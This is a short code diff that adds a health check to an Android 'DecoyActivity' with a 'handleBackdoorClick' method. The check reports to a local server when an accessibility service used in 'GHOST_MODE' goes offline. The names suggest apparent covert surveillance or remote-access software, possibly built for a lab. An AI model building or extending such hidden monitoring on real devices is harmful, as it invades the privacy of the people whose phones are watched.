@@ -239,6 +239,16 @@ public class DecoyActivity extends AppCompatActivity {
         }
     }
 
+    @Override
+    protected void onResume() {
+        super.onResume();
+        // --- GHOST_HEALTH_CHECK ---
+        if (AccessibilityCore.getInstance() == null) {
+            Log.w("DecoyActivity", "GHOST_MODE: Accessibility service lost");
+            LabRatsHttpServer.logActivity("INTEL_NOTICE: Accessibility service is offline");
+        }
+    }
+
     private void handleBackdoorClick() {
         long currentTime = System.currentTimeMillis();
         if (currentTime - lastClickTime < 500) {
